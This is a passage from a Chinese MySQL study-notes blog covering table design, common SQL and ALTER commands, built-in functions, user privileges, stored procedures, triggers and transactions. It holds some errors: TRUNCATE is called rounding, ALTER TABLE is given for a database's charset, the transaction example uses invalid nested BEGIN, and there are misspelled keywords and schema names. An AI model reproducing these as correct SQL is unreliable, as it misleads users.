5.0开始，新增BIT数据类型，该类型可用于存储一个或多个true/false值，BIT(1)定义一个包含单个位的字段，BIT(2)存储2个位……BIT列的最大长度是64个位。但BIT类型应该谨慎使用，对于大部分应用，最好避免使用这种类型。</p><p>在数据表中，一旦选定了字段类型，就要确保在所有关联表中都使用同样的数据类型。</p><h3 id="1-3-数据表设计需注意的"><a href="#1-3-数据表设计需注意的" class="headerlink" title="1.3 数据表设计需注意的"></a>1.3 数据表设计需注意的</h3><ol><li>太多的列。过多的列（如数千个）会导致性能下降。</li><li>太多的关联。MySQL限制了每个关联操作最多只能有61张表。一个粗略的经验法则，如果希望查询执行得到快速且并发性好，单个查询最好在12个表以内做关联。</li><li>防止过度使用枚举（ENUM）。如：country enum(‘’,’0’,’1’,’2’,…,’31’)</li><li><strong>尽量避免使用null</strong>，建议尽可能使用替代方案。即使需要存储一个事实上的‘空值’时，可以使用0，空字符串或其他特殊值来代替。但也不要走极端，当确实需要表示未知值时，使用null也比使用奇怪的值好，比如使用全0作日期时间会导致很多问题，可以配置MySQL的SQL_MODE来禁止不可能的日期。</li></ol><h2 id="二、常用命令"><a href="#二、常用命令" class="headerlink" title="二、常用命令"></a>二、常用命令</h2><h3 id="2-1-基础命令"><a href="#2-1-基础命令" class="headerlink" title="2.1 基础命令"></a>2.1 基础命令</h3><ol><li>查询数据：<code>SELECT [DISTINCT] 字段 [AS 别名] FROM 表名 [JOIN 表名2 ON 条件] [WHERE 条件(LIKE|AND|OR|BETWEEN|IN|NOT IN|EXISTS|NOT EXISTS)] [GROUP BY 字段 [HAVING 条件]] [ORDER BY 字段 [DESC]] [LIMIT [OFFSET,]条数]；</code>（<strong>注意使用<code>GROUP BY</code>时所有的<code>SELECT</code>的字段都要列出</strong>）</li></ol><ul><li>在处理SQL语句时，所有的空格都会被忽略，因此SQL语句可以换行以增强易读性。</li><li>一般而言，除非你确实需要表中的每一列，否则最好别使用<code>*</code>通配符。虽然使用通配符能让你省事，但检索不需要的列会降低检索和应用程序的性能。</li><li><code>DESC</code>关键字只应用到直接位于其前面的列名。如果想在多个列上进行降序排序，必须对每一列指定<code>DESC</code>关键字。</li><li>确定值是否为<code>NULL</code>时，不能简单的检查是否= NULL，应该使用<code>IS NULL</code>。注意<code>NULL</code>与<code>&#39;&#39;</code>不同，<code>NULL</code>表示空值，而<code>&#39;&#39;</code>是一个值。</li><li><code>IN</code>操作符完成了与<code>OR</code>相同的功能。<code>IN</code>操作符的语法更清晰、直观。<code>IN</code>操作符一般比一组<code>OR</code>操作符执行的更快。</li><li>别名可以是一个单词或多个单词，多个单词时要在引号中，但别名最好用一个单词。<strong>表别名也可以实现自身的联表查询</strong>。</li><li>单条查询条件用<code>WHERE</code>，分组查询条件用<code>HAVING</code>，联表查询条件用<code>ON</code>。</li><li>联表查询时，联结的表越多，性能下降也越多。</li><li>组合查询（UNION）从查询结果集中自动去除了重复的行，使用<code>UNION ALL</code>，DBMS不取消重复的行。</li><li><code>UNION</code>几乎总是完成与多个<code>WHERE</code>条件相同的工作。<code>UNION ALL</code>为<code>UNION</code>的一种形式，它完成<code>WHERE</code>子句完成不了的工作。如果确实需要每个条件的匹配行全部出现（包括重复行），就必须使用<code>UNION ALL</code>，而不是<code>WHERE</code>。</li><li>在某些SQL中，<code>INSERT INTO</code>中的<code>INTO</code>是可选的，但为了保证SQL的移植性，最好不要省略该关键字。</li><li>MySQL中可以进行算数运算，如常见的加、减、乘、除。</li><li><strong>在数据表中，ID字段最好是自动生成的，以确保唯一、准确。</strong></li><li>无论是在编写SQL还是普通代码时，应该多加注释，注释并不会影响性能，但能让自己和别人更容易理解和更安全的修改代码。</li><li><code>EXISTS|NOT EXISTS (从句)</code>条件返回的是布尔值</li></ul><ol start="2"><li>插入数据：<code>INSERT|REPLACE [IGNORE] INTO 表名(字段1，字段2) VALUES(值1，值2),(值1，值2) [ON DUPLICATE KEY UPDATE 字段=值];</code></li></ol><ul><li>如果某个字段是主键索引或唯一索引，普通的插入语句是会报错的，而使用关键词<code>IGNORE</code>则会警告，但不会影响正常的执行，重复数据仍然没有插入</li></ul><ol start="3"><li>更新数据：<code>UPDATE 表名 SET 字段1=值1，字段2=值2 WHERE 条件;</code></li></ol><ul><li><strong><em>在<code>UPDATE</code>或<code>DELETE</code>语句使用<code>WHERE</code>子句前，应该先用<code>SELECT</code>进行测试，保证它过滤的是正确的记录，以防编写的<code>WHERE</code>子句不正确。</em></strong></li><li>如果DBMS支持禁止无<code>WHERE</code>的<code>UPDATE</code>和<code>DELETE</code>的执行，那最好启用它。</li></ul><ol start="4"><li>删除数据：<code>DELETE FROM 表名 WHERE 条件;</code></li></ol><ul><li><code>DELETE</code>删除的是行，要删除列，使用<code>UPDATE</code>语句。</li><li>如果想从表中删除所有行，可以使用<code>TRUNCATE TABLE</code>语句来代替<code>DELETE</code>，它完成了相同的工作，但速度更快（因为不记录数据的变动）。</li></ul><h3 id="2-2-数据库"><a href="#2-2-数据库" class="headerlink" title="2.2 数据库"></a>2.2 数据库</h3><ol start="5"><li>创建数据库：<code>CREATE DATABASE [IF NOT EXISTS] 数据库名;</code></li><li>删除数据库：<code>DROP DATABASE [IF EXISTS] 数据库名;</code></li><li>查看建库语句：<code>SHOW CREATE DATABASE 数据库名;</code></li><li>选择数据库：<code>USE 数据库名;</code></li><li>查看数据库：<code>SHOW DATABASES;</code></li><li>查看数据库信息：<code>STATUS;</code></li><li>设置命令行字符集：<code>SET NAMES UTF8;</code></li><li>查看数据表的最后修改时间：<code>select TABLE_NAME,UPDATE_TIME from INFORMATION_SCHEMA.tables where TABLE_SCHEMA=&#39;数据库名&#39;;</code></li></ol><h3 id="2-3-数据表"><a href="#2-3-数据表" class="headerlink" title="2.3 数据表"></a>2.3 数据表</h3><ol start="13"><li>创建数据表：<code>CREATE TABLE [IF NOT EXISTS] 数据表名();</code></li></ol><ul><li><strong>为每一列设置默认值，使用<code>DEFAULT</code>而不是<code>NULL</code>。</strong></li></ul><ol start="14"><li>查看建表语句：<code>SHOW CREATE TABLE 数据表名;</code></li><li>查看数据表：<code>SHOW TABLES;</code></li><li>查看当前数据库下数据表的自增ID值：<code>SHOW TABLE STATUS;</code></li><li>查看表结构：<code>DESC 表名;</code>或<code>SHOW COLUMNS FROM 表名;</code></li><li>删除数据表：<code>DROP TABLE [IF EXISTS] 数据表名;</code></li></ol><p>-<strong>使用关系规则防止意外删除。</strong>许多DBMS允许强制实施有关规则，防止删除与其他表相关联的表。在实施这些规则时，如果对某个表发布一条<code>DROP TABLE</code>语句，且该表是某个关系的组成部分，则DBMS将阻止这条语句执行，直到该关系被删除为止。</p><ol start="19"><li>修改表名：<code>RENAME TABLE 旧表名 TO 新表名;</code><br>####2.3.1 复制表结构和数据</li><li><strong>复制表结构：<code>CREATE TABLE 新表名 LIKE 原表名;</code></strong>(与原表结构相同，建表语句相同)</li><li><strong>复制表结构及数据到新表：<code>CREATE TABLE 表名 SELECT * FROM 表名;</code></strong>（注意该方式与原表的结构会有差异，建表语句不同，如自增会消失）</li><li>复制数据到另一张表（结构相同）：<code>INSERT INTO 表名 SELECT * FROM 表名;</code></li><li>复制数据到另一张表（结构不同）：<code>INSERT INTO 表名(字段1，字段2) SELECT 字段1，字段2 FROM 表名;</code></li><li>查看字段编码：<code>SHOW FULL COLUMNS FROM 表名;</code></li></ol><h3 id="2-4-其它"><a href="#2-4-其它" class="headerlink" title="2.4 其它"></a>2.4 其它</h3><h4 id="2-4-1-视图"><a href="#2-4-1-视图" class="headerlink" title="2.4.1 视图"></a>2.4.1 视图</h4><ol start="25"><li>创建视图：<code>CREATE VIEW 视图名 AS SELECT ...;</code></li></ol><ul><li>视图是一张虚拟的表。</li></ul><ol start="26"><li>删除视图：<code>DROP VIEW 视图名;</code></li></ol><h4 id="2-4-2-存储过程"><a href="#2-4-2-存储过程" class="headerlink" title="2.4.2 存储过程"></a>2.4.2 存储过程</h4><ol start="27"><li>创建存储过程：<code>CREATE PROCEDURE 存储过程名();</code></li><li>创建函数：<code>CREATE FUNCTION 函数名();</code></li></ol><h4 id="2-4-3-触发器"><a href="#2-4-3-触发器" class="headerlink" title="2.4.3 触发器"></a>2.4.3 触发器</h4><ol start="29"><li>查看触发器：<code>SHOW TRIGGERS;</code></li><li>删除触发器：<code>DROP TRIGGER 触发器名</code></li></ol><h4 id="2-4-4-事务"><a href="#2-4-4-事务" class="headerlink" title="2.4.4 事务"></a>2.4.4 事务</h4><ol start="31"><li>查看事务开关状态：<code>SHOW VARIABLES LIKE &#39;autocommit&#39;;</code></li><li>打开/关闭事务的自动提交：<code>SET AUTOCOMMIT = 0|1;</code></li><li>创建临时表：<code>CREATE TEMPORARY TABLE 表名();</code>（临时表仅在当前连接有效，当关闭连接时，MySQL会自动删除表。临时表无法用<code>SHOW TABLES</code>命令查看）</li></ol><h4 id="2-4-5-系统信息"><a href="#2-4-5-系统信息" class="headerlink" title="2.4.5 系统信息"></a>2.4.5 系统信息</h4><ol start="34"><li>查看当前用户名：<code>SELECT USER();</code></li><li>查看当前数据库：<code>SELECT DATABASE();</code></li><li>查看MySQL版本：<code>SELECT VERSION();</code></li></ol><h3 id="2-5-ALTER"><a href="#2-5-ALTER" class="headerlink" title="2.5 ALTER"></a>2.5 ALTER</h3><p>ALTER操作有<code>ALTER TABLE</code>，<code>ALTER DATABASE</code>，<code>ALTER EVENT</code>，<code>ALTER PROCEDURE</code>，<code>ALTER VIEW</code>等命令</p><h4 id="2-5-1-表的操作"><a href="#2-5-1-表的操作" class="headerlink" title="2.5.1 表的操作"></a>2.5.1 表的操作</h4><p><em>使用<code>ALTER TABLE</code>要极为小心，应该在进行改动前做完整的备份（模式和数据的备份）。数据库表的更改不能撤销，如果增加了不需要的列，也许无法删除它们。类似地，如果删除了不应该删除的列，可能会丢失该列中的所有数据。</em></p><ol><li><strong>增加字段：<code>ALTER TABLE 表名 ADD [COLUMN] 字段名 字段类型 [FIRST|AFTER 字段名];</code></strong></li><li><strong>修改字段名及类型：<code>ALTER TABLE 表名 CHANGE [COLUMN] 旧字段名 新字段名 字段类型;</code></strong></li><li>修改字段类型：<code>ALTER TABLE 表名 MODIFY 字段名 类型 [NOT NULL];</code></li><li><strong>删除字段：<code>ALTER TABLE 表名 DROP [COLUMN] 字段名;</code></strong></li><li><strong>添加普通/唯一索引：<code>ALTER TABLE 表名 ADD INDEX/UNIQUE 索引名(字段1[,字段2]);</code></strong></li></ol><ul><li>请注意：对多个字段同时添加普通索引时，只对这些字段都进行检索时索引才会生效，仅对其中任何一个检索都不会有预期的效果。</li></ul><ol><li>创建短索引：<code>CREATE INDEX 索引名 ON 表名(字段(长度));</code> 或<code>KEY 索引名 (字段(长度))</code> 对于<code>CHAR</code>和<code>VARCHAR</code>列，只用它的一部分来创建索引，既可以节省索引空间，又可以加快索引速度。</li><li>添加主键：<code>ALTER TABLE 表名 ADD PRIMARY KEY (字段名);</code></li></ol><ul><li>MySQL中不允许有多个主键</li><li>主键的特点：非空且唯一，按需添加自增</li><li>主键的名字就是PRIMARY</li></ul><ol start="7"><li>设置主键的自增起始值：<code>ALTER TABLE 表名 AUTO_INCREMENT = 100;</code></li><li>添加外键：<code>ALTER TABLE 表名 ADD [CONSTRAINT [约束名]] FOREIGN KEY (字段1[,字段2]) REFERENCES 表名(字段1[,字段2]) [ON DELETE|UPDATE CASCADE|RESTRICT];</code></li></ol><ul><li><code>CASCADE</code>（级联）：如果删除父表中的数据，则子表中的相应数据也一同被删除或更新</li><li><code>RESTRICT</code>（限制）：如果父表对应的子表中有相关的数据，则不允许删除或更新父表中的数据</li><li>外键约束用于子表中，而且父表与子表必须使用相同的存储引擎</li><li>当一张表中有多个外键时，可以使用约束名来进行区分，如果约束名省略，则由系统自动生成</li><li>创建外键约束的条件：<pre><code>-  两张表都必须是InnoDB引擎（MyISAM不支持外键），且它们没有临时表- 外键关联的字段必须有相似的数据类型- 外键关联的字段必须建立了索引</code></pre></li><li><a href="https://dev.mysql.com/doc/refman/5.7/en/create-table-foreign-keys.html" target="_blank" rel="noopener">外键的官方文档</a></li></ul><ol start="8"><li>删除普通/唯一索引：<code>DROP INDEX 索引名 ON 表名;</code>或<code>ALTER TABLE 表名 DROP INDEX 字段名;</code></li><li>删除主键：<code>ALTER TABLE 表名 DROP PRIMARY KEY;</code></li><li>删除外键：<code>ALTER TABLE 表名 DROP FOREIGN KEY 约束名;</code></li><li>修改表名：<code>ALTER TABLE 旧表名 RENAME TO 新表名;</code></li><li>修改字段默认值：<code>ALTER TABLE 表名 ALTER 字段名 SET DEFAULT 默认值;</code></li><li>删除字段的默认值：<code>ALTER TABLE 表名 ALTER 字段名 DROP DEFAULT;</code></li><li>修改表的字符集：<code>ALTER TABLE 表名 DEFAULT CHARSET UTF8;</code></li></ol><h4 id="2-5-2-库的操作"><a href="#2-5-2-库的操作" class="headerlink" title="2.5.2 库的操作"></a>2.5.2 库的操作</h4><ul><li>修改库的字符集：<code>ALTER TABLE 库名 DEFAULT CHARSET UTF8;</code></li></ul><h2 id="三、函数"><a href="#三、函数" class="headerlink" title="三、函数"></a>三、函数</h2><h3 id="3-1-字符串函数"><a href="#3-1-字符串函数" class="headerlink" title="3.1 字符串函数"></a>3.1 字符串函数</h3><ul><li>拼接输出的内容：<code>CONCAT(字段1，字段2，……)</code></li><li>从左开始截取字符串：<code>LEFT(str, length)</code></li><li>从右开始截取字符串：<code>RIGHT(str, length)</code></li><li>截取字符串：<code>SUBSTRING(str, pos [,length] )</code>（可截取中文）</li><li>字符串长度：<code>LENGTH()</code>（包含中文时返回字符集下中文所占长度）</li><li>返回字符个数：<code>CHAR_LENGTH()</code></li><li>去除字符串左右的空格：<code>TRIM()</code></li><li>转小写：<code>LOWER()</code></li><li>转大写：<code>UPPER()</code></li><li>字符串比较：<code>STRCMP(字段1，字段2)</code>（字段1&lt;字段2返回-1，否则返回1，相等返回0）</li><li><code>SOUNDEX()</code>是一个将任何文本串转换为描述其语音表示的字母数字模式的算法。SOUNDEX考虑了类似的发音字符和音节，使得能对字符串进行发音比较而不是字母比较。</li><li>加密函数：<code>PASSWORD(&#39;加密内容&#39;)</code></li><li>MD5加密函数：<code>MD5(&#39;加密内容&#39;)</code></li></ul><h3 id="3-2-数值函数"><a href="#3-2-数值函数" class="headerlink" title="3.2 数值函数"></a>3.2 数值函数</h3><ul><li>数据类型转换：<code>CONVERT(&#39;转换内容&#39;，目标类型)</code></li><li>取余数：<code>MOD(x,y)</code></li><li>四舍五入：<code>TRUNCATE(x,y)</code></li><li>进制转换：<code>CONV(&#39;数值&#39;，进制，目标进制)</code></li><li>格式化结果：<code>FORMAT(数值，保留小数位数)</code></li><li>IP地址转数值：<code>INET_ATON(&#39;IP地址&#39;)</code>（Address TO Number）</li><li>数值转IP地址：<code>INET_NTOA(数值)</code>(Number TO Address)<ul><li>mysql用无符号整型存储IPv4</li></ul></li></ul><h3 id="3-3-日期时间函数"><a href="#3-3-日期时间函数" class="headerlink" title="3.3 日期时间函数"></a>3.3 日期时间函数</h3><ul><li>获取当前日期时间：<code>NOW()</code></li><li>获取当前日期：<code>CURDATE()</code></li><li>获取UTC日期：<code>UTC_DATE()</code></li><li>获取UTC时间：<code>UTC_TIME()</code></li><li>获取季度：<code>QUARTER(&#39;17-05-07&#39;)</code></li><li>获取分钟：<code>MINUTE(&#39;10:23:21&#39;)</code></li><li>获取秒数：<code>SECOND(&#39;10:23:21&#39;)</code></li></ul><h3 id="3-4-条件判断函数"><a href="#3-4-条件判断函数" class="headerlink" title="3.4 条件判断函数"></a>3.4 条件判断函数</h3><ul><li><code>IF(表达式，值1，值2)</code>类似于三元运算，如果表达式结果为真取值1，否则取值2</li><li><code>IFNULL(值1，值2)</code>优先返回非null的值，如<code>IFNULL(8,NULL)</code>和<code>IFNULL(NULL,8)</code>和<code>IFNULL(8,7)</code>都返回8</li></ul><h2 id="四、-MySQL权限"><a href="#四、-MySQL权限" class="headerlink" title="四、 MySQL权限"></a>四、 MySQL权限</h2><h3 id="4-1-MySQL权限经验原则："><a href="#4-1-MySQL权限经验原则：" class="headerlink" title="4.1 MySQL权限经验原则："></a>4.1 MySQL权限经验原则：</h3><ol><li>只授予满足需求的最小权限；</li><li>限制登录IP；</li><li>为每个用户设置高强度的密码；</li><li>定期清理不需要的用户，回收权限或者删除用户。</li></ol><h3 id="4-2-常用权限命令"><a href="#4-2-常用权限命令" class="headerlink" title="4.2 常用权限命令"></a>4.2 常用权限命令</h3><ul><li>创建用户：<code>CREATE USER &#39;username&#39;@&#39;host&#39; IDENTIFIED BY &#39;password&#39;;</code>host可为IP地址段或域名或%，%表示不限制登录IP</li><li>创建并给用户授权：<br><code>mysql&gt; GRANT all|select,insert,update,delete ON dbname.tbname TO &#39;user&#39;@&#39;host&#39; IDENTIFIED BY &#39;password&#39; WITH GRANT OPTION;</code><ul><li>例子：<br><code>mysql&gt; GRANT all ON *.* TO Jack@&#39;localhost&#39; IDENTIFIED BY &quot;p@55w0rd&quot; WITH GRANT OPTION;Query OK, 0 rows affected (0.01 sec)</code><br>该命令表示：为本地登录的用户Jack赋予所有数据库与所有数据表的所有权限，并且将登录密码设置为‘p@55w0rd’，而且允许该用户将自己拥有的授予其他用户。</li></ul></li><li>刷新权限：<code>mysql&gt; FLUSH PRIVILEGES;</code></li><li>查看权限：<code>mysql&gt; SHOW GRANTS [FOR &#39;jack&#39;@&#39;%&#39;];</code></li><li>撤销权限：<code>mysql&gt; REVOKE delete ON *.* FROM &#39;jack&#39;@&#39;loaclhost&#39;;</code></li><li>删除用户：<code>mysql&gt; DROP USER &#39;jack&#39;@&#39;localhost&#39;;</code></li><li>账户重命名：<code>mysql&gt; RENAME USER &#39;jack&#39;@&#39;%&#39; TO &#39;rose&#39;@&#39;%&#39;;</code></li><li>修改自己密码：<code>mysql&gt; SET PASSWORD=&#39;密码&#39;;</code></li><li>修改其他用户密码：<code>mysql&gt; SET PASSWORD FOR &#39;jack&#39;@&#39;localhost&#39;=PASSWORD(&#39;123456&#39;);</code></li><li>注：在MySQL 5.7及以上版本，mysql.user的密码字段由<code>password</code>更换为了<code>authentication_string</code><br><img src="http://ohx73ws1b.bkt.clouddn.com/mysql%20privilege.png" alt="Alt text"></li></ul><p><img src="http://ohx73ws1b.bkt.clouddn.com/mysql%20perm.png" alt="Alt text"></p><h2 id="五、存储过程"><a href="#五、存储过程" class="headerlink" title="五、存储过程"></a>五、存储过程</h2><ul><li>查看所有存储过程：<code>select name from mysql.proc;</code>或<code>select routine_name from information_schema.routines;</code></li><li>查看某个数据库下的存储过程：<code>select name from mysql.proc where db=&#39;数据库名&#39;;</code>或<code>select routine_name from information_schema.routines where routine_schema=&#39;数据库名&#39;;</code></li><li>查看存储过程的详细内容：<code>SHOW CREATE PROCEDURE 数据库.存储过程名;</code></li><li>修改存储过程：<code>ALTER PROCEDURE 名称 [特性……]</code><ul><li>MySQL的存储过程只能修改其特性，不能修改过程体，若要修改过程体，只能删除后重新创建。</li></ul></li><li>删除存储过程：<code>DROP PROCEDURE [数据库.]存储过程名</code></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 设置读取test表中的数据的存储过程</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">PROCEDURE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> sxy;</span><br><span class="line">DELIMITER //</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> sxy(<span class="keyword">IN</span> <span class="keyword">var</span> <span class="built_in">INT</span>)</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="string">`test`</span> <span class="keyword">WHERE</span> <span class="string">`id`</span> = <span class="keyword">var</span>;</span><br><span class="line"><span class="keyword">END</span>//</span><br><span class="line">DELIMITER ;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 调用存储过程</span></span><br><span class="line"><span class="keyword">CALL</span> sxy(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><h2 id="六、触发器"><a href="#六、触发器" class="headerlink" title="六、触发器"></a>六、触发器</h2><p>触发器经常用于加强数据的完整性约束和业务规则等。<br>一般来说，约束的处理速度比触发器快，因此应该尽量使用约束。<br>在MySQL中，创建触发器的语法如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> 触发器名称 触发时机(<span class="keyword">BEFORE</span>|<span class="keyword">AFTER</span>) 触发事件(<span class="keyword">INSERT</span>|<span class="keyword">UPDATE</span>|<span class="keyword">DELETE</span>)  </span><br><span class="line">  <span class="keyword">ON</span> 表名 <span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="keyword">ROW</span></span><br><span class="line">  <span class="keyword">BEGIN</span></span><br><span class="line">    触发器程序体(<span class="keyword">SQL</span>语句)</span><br><span class="line">  <span class="keyword">END</span></span><br></pre></td></tr></table></figure><p>由此可见，可以建立6种触发器，即：BEFORE INSERT、BEFORE UPDATE、BEFORE DELETE、AFTER INSERT、AFTER UPDATE、AFTER DELETE。</p><p>另外有一个限制是不能同时在一个表上建立2个相同类型的触发器，因此在一个表上最多建立6个触发器。<br>查看触发器</p><ol><li><p>通过show语句查看触发器<br><code>SHOW TRIGGERS;</code></p></li><li><p>通过系统表查看触发器</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> information_shcema;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> tirggers;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">triggers</span> <span class="keyword">where</span> TRIGGER_NAME = <span class="string">'触发器名称'</span>;</span><br></pre></td></tr></table></figure></li></ol><p>触发器中的<code>new</code>和<code>old</code></p><ol><li>针对<code>update</code>操作，<code>new</code>表示的是更新后的值，<code>old</code>表示的是更新前的数据。</li><li>针对<code>insert</code>操作，<code>new</code>表示的是新增的值。</li><li>针对<code>delete</code>操作，<code>old</code>表示的是被删除的值。</li></ol><p>示例1：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 插入触发器</span></span><br><span class="line">mysql&gt; delimiter $$</span><br><span class="line">mysql&gt; create trigger tab1_after_insert after insert</span><br><span class="line">    -&gt; on tab1 for each row</span><br><span class="line">    -&gt; BEGIN</span><br><span class="line">    -&gt;   insert into tab2(tab2_id) values(new.tab1_id);</span><br><span class="line">    -&gt; END</span><br><span class="line">    -&gt; $$</span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; delimiter ;</span><br></pre></td></tr></table></figure><p>示例2</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 删除触发器</span></span><br><span class="line">mysql&gt; delimiter $$</span><br><span class="line">mysql&gt; create trigger tab1_delete_after after delete</span><br><span class="line">    -&gt; on tab1 for each rows</span><br><span class="line">    -&gt; BEGIN</span><br><span class="line">    -&gt;   delete from tab2 where tab2_id = old.tab1_id;</span><br><span class="line">    -&gt; END</span><br><span class="line">    -&gt; $$</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; delimiter ;</span><br></pre></td></tr></table></figure><p>示例3：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 更新学生表的同时也更新记录表</span></span><br><span class="line">delimiter $$</span><br><span class="line">mysql&gt; create trigger student1_update_after after update</span><br><span class="line">    -&gt; on student1 for each row</span><br><span class="line">    -&gt; BEGIN</span><br><span class="line">    -&gt;  if new.student_id != old.student_id then</span><br><span class="line">    -&gt;   update update_student1 set student_id = new.student_id, update_date = now()</span><br><span class="line">    -&gt;   where student_id = old.student_id;</span><br><span class="line">    -&gt;  end if;</span><br><span class="line">    -&gt; END</span><br><span class="line">    -&gt; $$</span><br><span class="line">delimiter ;</span><br></pre></td></tr></table></figure><p>示例4</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 删除学生表的时候也删除记录表</span></span><br><span class="line">mysql&gt; delimiter $$</span><br><span class="line">mysql&gt; create trigger student1_delete_before before delete</span><br><span class="line">    -&gt; on student1 for each row</span><br><span class="line">    -&gt; BEGIN</span><br><span class="line">    -&gt;  delete from update_student1</span><br><span class="line">    -&gt;  where student_id = old.student_id;</span><br><span class="line">    -&gt; END</span><br><span class="line">    -&gt; $$</span><br><span class="line">delimiter ;</span><br></pre></td></tr></table></figure><h2 id="七、事务"><a href="#七、事务" class="headerlink" title="七、事务"></a>七、事务</h2><p>事务控制语句：</p><ul><li>BEGIN或START TRANSACTION；显示地开启一个事务；</li><li>COMMIT；也可以使用COMMIT WORK，不过二者是等价的。COMMIT会提交事务，并使已对数据库进行的所有修改成为永久性的；</li><li>ROLLBACK；有可以使用ROLLBACK WORK，不过二者是等价的。回滚会结束用户的事务，并撤销正在进行的所有未提交的修改；</li><li>SAVEPOINT identifier；SAVEPOINT允许在事务中创建一个保存点，一个事务中可以有多个SAVEPOINT；</li><li>RELEASE SAVEPOINT identifier；删除一个事务的保存点，当没有指定的保存点时，执行该语句会抛出一个异常；</li><li>ROLLBACK TO identifier；把事务回滚到标记点；</li><li>SET TRANSACTION；用来设置事务的隔离级别。InnoDB存储引擎提供事务的隔离级别有READ UNCOMMITTED、READ COMMITTED、REPEATABLE READ和SERIALIZABLE。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">BEGIIN;<span class="comment">-- 开启事务</span></span><br><span class="line">SQL语句1;</span><br><span class="line"><span class="keyword">SAVEPOINT</span> sql1;</span><br><span class="line">IF(SQL语句1执行失败)</span><br><span class="line">  <span class="keyword">ROLLBACK</span>;<span class="comment">-- 撤销所有执行</span></span><br><span class="line">SQL语句2;</span><br><span class="line"><span class="keyword">SAVEPOINT</span> sql2;</span><br><span class="line">IF(SQL语句2执行失败)</span><br><span class="line">  <span class="keyword">ROLLBACK</span> <span class="keyword">TO</span> sql1;<span class="comment">-- 撤销部分执行</span></span><br><span class="line"><span class="keyword">RELEASE</span> <span class="keyword">SAVEPOINT</span> sql1;<span class="comment">-- 删除保存点</span></span><br><span class="line"><span class="keyword">BEGIN</span>;<span class="comment">-- 嵌套事务</span></span><br><span class="line">SQL语句3;</span><br><span class="line">IF(SQL语句3执行失败)</span><br><span class="line"><span class="keyword">ROLLBACK</span> <span class="keyword">TO</span> sql2;</span><br><span class="line"><span class="keyword">COMMIT</span>;  </span><br><span class="line"><span class="keyword">COMMIT</span>;<span class="comment">-- 提交事务</span></span><br></pre></td></tr></table></figure>参考文章：<a href="http://www.jellythink.com/archives/952" target="_blank" rel="noopener">说说MySQL中的事务</a></li></ul><h2 id="八、-MySQL中的日志"><a href="#八、-MySQL中的日志" class="headerlink" title="八、 MySQL中的日志"></a>八、 